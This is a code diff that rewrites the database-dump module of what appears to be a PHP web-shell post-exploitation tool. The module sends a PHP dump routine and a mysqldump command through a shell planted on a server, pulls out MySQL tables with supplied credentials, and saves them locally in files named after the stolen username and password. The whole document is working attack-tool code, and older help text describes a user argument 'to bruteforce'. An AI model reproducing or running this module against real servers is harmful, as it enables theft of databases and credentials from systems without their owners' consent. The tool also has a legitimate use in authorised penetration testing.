@@ -1,35 +1,18 @@
-'''
-Created on 22/ago/2011
+from core.moduleprobeall import ModuleProbeAll
+from core.moduleexception import ProbeException, ProbeSucceed
+from core.savedargparse import SavedArgumentParser as ArgumentParser
 
-@author: norby
-'''
-
-from core.module import Module, ModuleException
-from core.vector import VectorList, Vector
-import random
-from core.parameters import ParametersList, Parameter as P
-
-classname = 'Dump'
-
-
-class Dump(Module):
-    '''Get SQL database dump
-    :sql.dump mysql <host> <user> <pass> <db name> <table name>|any
-    '''
-
-
-    vectors = VectorList( [
-            Vector('shell.php', 'mysqlphpdump', """
-function dmp ($table)
+mysqlphpdump = """
+function dmp ($tableQ)
 {
-    $result .= "\n-- -------- TABLE '$table' ----------\n";
-    $query = mysql_query("SELECT * FROM ".$table);
+    $result = "\n-- Dumping data for table `$tableQ`\n";
+    $query = mysql_query("SELECT * FROM ".$tableQ);
     $numrow = mysql_num_rows($query);
     $numfields = mysql_num_fields($query);
     print $numrow . " " . $numfields;
     if ($numrow > 0)
     {
-        $result .= "INSERT INTO `".$table."` (";
+        $result .= "INSERT INTO `".$tableQ."` (";
         $i = 0;
         for($k=0; $k<$numfields; $k++ )
         {
@@ -75,17 +58,16 @@ function dmp ($table)
     return $result . "\n\n";
 }
 ini_set('mysql.connect_timeout',1);
-$res=mysql_connect("%s", "%s", "%s");
-$db_name = "%s";
-$db_table_name = "%s";
+$res=mysql_connect("$host", "$user", "$pass");
+if(!$res) { print("-- DEFAULT\n"); }
+else {
+$db_name = "$db";
+$db_table_name = "$table";
 mysql_select_db($db_name);
 $tableQ = mysql_list_tables ($db_name);
 $i = 0;
 $num_rows = mysql_num_rows ($tableQ);
 if($num_rows) {
-
-if(!$res) {print("-- DEFAULT\n"); }
-
 while ($i < $num_rows)
 {
     $tb_names[$i] = mysql_tablename ($tableQ, $i);
@@ -96,105 +78,55 @@ while ($i < $num_rows)
 }
 }
 mysql_close();
-"""),
-   Vector('shell.sh', 'mysqldump', "mysqldump -h %s -u %s --password=%s %s %s --single-transaction") ,
-    # --single-transaction to avoid bug http://bugs.mysql.com/bug.php?id=21527
+}"""
 
-            ])
+WARN_DUMP_ERR_SAVING = 'Can\'t save dump file'
+WARN_DUMP_SAVED = 'Dump file saved'
+WARN_DUMP_INCOMPLETE = 'Dump seems incorrect, saving anyway for debug purposes'
+WARN_NO_DUMP = 'Dump failed, check credentials and dbms informations'
 
+class Dump(ModuleProbeAll):
+    '''Get SQL database dump'''
 
-    params = ParametersList('Get SQL mysqldump-like database dump', vectors,
-            P(arg='dbms', help='DBMS', choices=['mysql'], required=True, pos=0),
-            P(arg='user', help='SQL user to bruteforce', required=True, pos=1),
-            P(arg='pwd', help='SQL password', required=True, pos=2),
-            P(arg='db', help='Database name', required=True, pos=3),
-            P(arg='table', help='Table name to dump (any to dump entire database)', default='any', pos=4),
-            P(arg='host', help='SQL host or host:port', default='127.0.0.1', pos=5),
-            P(arg='lfile', help='Local path (keep \'auto\' for automatic naming)', default='auto', pos=6))
-
-
-    def __init__( self, modhandler , url, password):
-
-        self.structure = {}
-
-        Module.__init__(self, modhandler, url, password)
-
-
-
-    def run_module( self, mode, user, pwd , db, table, host, lpath ):
-
-        if mode != 'mysql':
-            raise ModuleException(self.name,  "Only 'mysql' database is supported so far")
-
-
-        uri = '%s:%s@%s-%s' % (user, pwd, host, db)
-
-        vectors = self._get_default_vector2()
-        if not vectors:
-            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells + [ 'sql.query' ])
-        for vector in vectors:
-            response = self.__execute_payload(vector, [mode, host, user, pwd, db, table])
-            if response != None:
-
-                if response.startswith('-- DEFAULT'):
-                    # mysqlphpdump default fallback
-                    self.mprint("[%s] Error connecting to '%s', using default (query 'SELECT USER();' to print out)" % ( self.name, uri))
-                    uri = 'default'
-                elif 'mysqldump: Got error:' in response:
-                    # mysqldump output but error
-                    self.mprint("[%s] Error connecting to '%s', check credentials and db name" % ( self.name, uri))
-
-                try:
-                    if lpath == 'auto':
-                        lpath = '%s.txt' % uri
-
-                    self.mprint("[%s] Saving '%s' dump in '%s'" % (self.name, uri, lpath))
-
-                    lfile = open(lpath,'w')
-                except:
-                    raise ModuleException(self.name,  "Error opening dump file \'%s\'" % lpath)
-
-                self.params.set_and_check_parameters({'vector' : vector.name})
-
-                lfile.write(response)
-                lfile.close()
-                return
-
-        self.mprint('[%s] Error dumping \'%s\', check credentials, host and database name' % (self.name, uri))
-
-
-    def __execute_payload(self, vector, parameters):
-
-        mode = parameters[0]
-        host = parameters[1]
-        user = parameters[2]
-        pwd = parameters[3]
-        db = parameters[4]
-        table = parameters[5]
-
-        if table == 'any':
-            table = ''
-
-        self.modhandler.set_verbosity(2)
-
-        self.structure[db] = {}
-
-        payload = self.__prepare_payload(vector, [host, user, pwd, db, table])
-        response = self.modhandler.load(vector.interpreter).run({ 0: payload })
-
-        self.modhandler.set_verbosity()
-
-        if response:
-            return response
-
-    def __prepare_payload( self, vector, parameters):
-
-        if vector.payloads[0].count( '%s' ) == len(parameters):
-            return vector.payloads[0] % tuple(parameters)
+    def _set_vectors(self):
+        self.vectors.add_vector('mysqlphpdump', 'shell.php',  [ mysqlphpdump ] )
+        self.vectors.add_vector('mysqldump', 'shell.sh', "mysqldump -h $host -u $user --password=$pass $db $table --single-transaction") 
+        # --single-transaction to avoid bug http://bugs.mysql.com/bug.php?id=21527        
+    
+    
+    def _set_args(self):
+        self.argparser.add_argument('user', help='SQL username')
+        self.argparser.add_argument('pass', help='SQL password')
+        self.argparser.add_argument('db', help='Database to dump')
+        self.argparser.add_argument('-table', help='Table to dump')
+        self.argparser.add_argument('-host', help='DBMS host or host:port', default='127.0.0.1')
+        #argparser.add_argument('-dbms', help='DBMS', choices = ['mysql', 'postgres'], default='mysql')
+        self.argparser.add_argument('-vector', choices = self.vectors.keys())
+        self.argparser.add_argument('-ldump', help='Where to save dump')
+        
+    def _prepare_vector(self):
+        if not self.args['table']:
+            self.args['table'] = ''
+        self.args_formats = self.args.copy()
+        
+    def _verify_execution(self):
+        if self._result and '-- Dumping data for table' in self._result:
+            raise ProbeSucceed(self.name,'Dumped')
+            
+    def _output_result(self):
+        
+        if self._result: 
+            if not '-- Dumping data for table' in self._result:
+                self.mprint(WARN_DUMP_INCOMPLETE)
+            
+            if not self.args['ldump']:
+                self.args['ldump'] = '%s:%s@%s-%s.txt' % (self.args['user'], self.args['pass'], self.args['host'], self.args['db'])
+                
+            try:
+                lfile = open(self.args['ldump'],'w').write(self._result)
+            except:
+                raise ProbeException(self.name,  "\'%s\' %s" % (self.args['ldump'], WARN_DUMP_ERR_SAVING))
+            else:
+                self.mprint("\'%s\' %s" % (self.args['ldump'], WARN_DUMP_SAVED))
         else:
-            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
-
-
-
-
-
+            raise ProbeException(self.name,  WARN_NO_DUMP)
